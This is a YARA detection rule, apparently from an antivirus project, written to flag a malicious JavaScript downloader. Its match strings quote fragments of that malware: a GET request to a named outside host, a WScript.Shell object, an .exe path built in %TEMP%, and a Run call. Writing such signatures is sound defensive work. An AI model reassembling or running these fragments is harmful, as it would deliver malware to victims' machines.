rule sig_20160412_8e1ebc134f825e86f820e616a1564ce1 {
  meta:
    description = "datamaliciousorder - file 20160412_8e1ebc134f825e86f820e616a1564ce1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7b209851c785a126b88f0685a88e076d3d317bc344f2349b5d37a7d0f961c0a2"

  strings:
    $s1  = "VupMt[IcxXd](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "function OdpSey(IeAo, PruYxq){OoNjd = OoNjd * 1; return IeAo - PruYxq;};" fullword ascii
    $s3  = "var VosSmz = function LmcOfq() {return WScript[DgRzf](\"WScript\"+\".Shell\");}(), EabGwh = 11;" fullword ascii
    $s4  = "if (VupMt[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CtOlp() {return VosSmz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"p1kIoxHxu.ex\" + \"e\";};" fullword ascii
    $s6  = "function WbTy(){return EmpOyt + \"\";};" fullword ascii
    $s7  = "function PtGxa() {return ((EgnAzi == true) && (EgnAzi == LmStu)) ? 1 : OoNjd;};" fullword ascii
    $s8  = "function AamBw()" fullword ascii
    $s9  = "var FxMtf = false;" fullword ascii
    $s10 = "LmStu = true; " fullword ascii
    $s11 = "var EgnAzi = false;" fullword ascii
    $s12 = "EgnAzi = true; " fullword ascii
    $s13 = "function UoKz(ZtkXs){VosSmz[\"R\"+\"un\"](ZtkXs, OoNjd, OoNjd);};" fullword ascii
    $s14 = "var LmStu = false;" fullword ascii
    $s15 = "function MxQr(NxzDje) {var BaNm = (1, 2, 3, 4, 5, NxzDje); return BaNm;};" fullword ascii
    $s16 = "var FhCs = new this[\"Date\"]();" fullword ascii
    $s17 = "function IhlKu(){return 23;};" fullword ascii
    $s18 = "function MyQbl(){return DgRzf;};" fullword ascii
    $s19 = "return OdpSey(IuFeg, ZmHsp);" fullword ascii
    $s20 = "}while (AdAn);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}